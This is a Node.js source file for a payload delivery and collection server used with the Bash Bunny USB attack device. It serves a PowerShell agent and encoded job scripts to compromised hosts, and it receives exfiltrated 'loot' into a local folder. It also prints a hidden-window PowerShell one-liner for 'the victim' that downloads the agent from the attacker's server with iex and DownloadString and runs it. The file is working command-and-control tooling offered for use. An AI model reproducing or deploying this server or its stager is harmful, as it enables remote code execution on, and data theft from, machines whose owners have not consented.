//Initializes main server modules
/*
    App Name: BBTPS Delivery Server
    Author: PoSHMagiC0de
    Description:
    Payload deliver servicer for BashBunny to handle delivery if
    Agent, payloads and reception of textual data.
*/

var Debug = process.env["JSDEBUG"] || false;
var prc = require('child_process');
prc.exec('LED SPECIAL1').unref();
var fs = require('fs');
var zlib = require('zlib');
var http = require('http');
//var express = require('express');
//var bodyParser = require('body-parser');
//var app = express();
var port = 1337;
var lootdir = process.env['LOOTDIR'] || __dirname + '/tmploot';
var jobsfolder = process.env['JOBFOLDER'] || __dirname + '/jobs/default';
var agentfile = __dirname + '/agent/bbAgent1.ps1';
var joblist = require(process.env['JOBLIST'] || (jobsfolder + '/joblist.json'));

//Initialize config variables for agent to pull
var SERVERIP = process.env["SERVERIP"];
var TARGET_HOSTNAME = process.env["TARGET_HOSTNAME"] || 'TestMachine';
var BB_SMBROOT = process.env["BB_SMBROOT"] || '\\\\' + SERVERIP + '\\tmploot';
var BB_SMBLOOT = process.env["BB_SMBLOOT"] || BB_SMBROOT + '\\' + TARGET_HOSTNAME;

//app.use(bodyParser.json());
//app.use(bodyParser.urlencoded({extended:false}));

var FirstRun = false;
var AgentRequested = false;
var hasJobs = true;

//process jobslist

if(Debug){
    console.log(joblist);
    console.log("Loot dir is:" + lootdir);
    console.log("Jobsfolder is:" + jobsfolder);
}
var helper = require(__dirname + '/helpers.js');

joblist = helper.jobParser(joblist, jobsfolder);
if(Debug){console.log(joblist);}

function writeJSONData(response, data) {
    response.writeHead(200, {"Content-Type": "application/json"});
    response.write(JSON.stringify(data));
    response.end();
}

function write404Response(request, response) {
    response.writeHead(404, {"Content-Type": "text/plain"});
    response.write("Error: Page not found");
    response.end();
}

function writeStringData(response, data) {
    response.writeHead(200, {"Content-Type": "text/plain"});
    response.write(data);
    response.end();
}

function onGet(request, response) {
    switch(request.url) {
        case "/getAgent":
            if(Debug){console.log('Agent Requested...');}
            if(AgentRequested == false){
                prc.exec('LED STAGE2').unref();
                if(Debug){console.log('Agent download led indicator lit..');}
                AgentRequested = true;
            }
            fs.readFile(agentfile, 'utf8', function(err, data){
                if(err){
                    if(Debug){console.log('Error reading Agent.');}
                    write404Response(request, response);
                    exit(1);
                }else{
                    if(Debug){console.log('Sending Agent...');}
                    //res.send(data);
                    writeStringData(response, data);
                }
            });
            break;

            case "/getConfig":
                var returnConfig = {}
                returnConfig.BB_SMBLOOT = BB_SMBLOOT;
                returnConfig.BB_SMBROOT = BB_SMBROOT;
                returnConfig.TARGET_HOSTNAME = TARGET_HOSTNAME;
                writeJSONData(response, returnConfig);
                break;

            case "/getJob1":
                if(Debug){console.log('A job was requested');}
                
                sendjob = joblist.pop();
                if(sendjob){
                    hasJobs = true;
                    if(FirstRun == false && hasJobs == true){
                        prc.exec('LED STAGE3').unref();
                        if(Debug){console.log('LED lights for first job sent..');}
                        FirstRun = true;
                    }
                    var payload = {};
                    payload.jobName = sendjob.jobName;
                    payload.command = sendjob.command;
                    payload.runType = sendjob.runType.toLowerCase();
                    fs.readFile(sendjob.scriptName, 'utf8', function(err, data){
                        if(err){
                            if(Debug){console.log("error reading payload");}
                            response.end();
                        }else{
                            zlib.deflateRaw(new Buffer(data), function(err, buffer){
                                payload.payload = buffer.toString('base64');
                                //console.log(payload);
                                //res.json(payload);
                                writeJSONData(response, payload);
                            })
                        }
                    });
                }else{
                    if(hasJobs == true){
                        hasJobs = false;
                        FirstRun = false;
                        if(Debug){console.log('No more jobs for agent, lighting LED for empty queue.');}
                        prc.exec('CLEANUP').unref();
                    }
                    var payload = {};
                    payload.jobName = "none";
                    payload.payload = "none";
                    //res.json(payload);
                    writeJSONData(response, payload);
                }
                break;

            case "/quit":
                prc.exec('LED FINISH').unref();
                writeStringData(response, "bye");
                process.exit(0);
                break;

            default:
                write404Response(request, response);
                break;
    }
}

function onPost(request, response) {
    switch(request.url) {

        case "/addJob":
            var preJob = "";
            request.on('data', function(chunk) {
                preJob += chunk;
            });
            request.on('end', function() {
                if(Debug){console.log(preJob);}
                var addJobObj = JSON.parse(preJob);
                addJobObj = helper.jobParser(addJobObj, jobsfolder);
                if(addJobObj){        
                    joblist.push(addJobObj);
                    //res.send('done');
                    writeStringData(response, "done");
                }else{
                    //res.send('error');
                    writeStringData(response, "error");
                }
            });            
            break;

        case "/pushData":
            var preLog = "";
            request.on('data', function(chunk) {
                preLog += chunk;
            });
            request.on('end', function() {
                if(Debug){console.log(preLog);}
                var logData = JSON.parse(preLog);
                if(logData.jobName){
                    var logtmp = lootdir + '/' + logData.jobName + '.log';
                    fs.writeFile(logtmp, logData.data, function(err){
                        if(err){
                            //res.send('error');
                            writeStringData(response, "error");
                        }else{
                            //res.send('success');
                            writeStringData(response, "success");
                        }
                    });
                }else{
                    //res.send('error');
                    writeStringData(response, "error");
                }
            });            
            break;
    }
}

function onRequest(request, response) {
    if(request.method == "GET") {
        onGet(request, response);
    }
    else if(request.method == "POST") {
        onPost(request, response);
    } else {
        write404Response(request, response);
    }
}

var server = http.createServer(onRequest);
server.listen(port, function(err) {
    if(err) {
        return console.log("Error starting server");
    }
    if(Debug){
        console.log('Starting Server');
        console.log('\x1b[33m%s\x1b[0m','Copy and paste the below command to launch the agent on the victim.');
        console.log('\x1b[32m%s\x1b[0m','powershell -NonI -Nop -C "$p=\''+SERVERIP+'\';$ic=1;$jr=0;while($ic -le 20){if((test-connection $p -count 1 -quiet) -eq $true){try{iex (new-object net.webclient).DownloadString(\'http://\'+\$p+\':1337/getAgent\');$jr=1;}catch{$ic++}if($jr){Invoke-bbAgent $p 1337 -verbose;exit}}else{$ic++}sleep -s 2}"');
    }
});
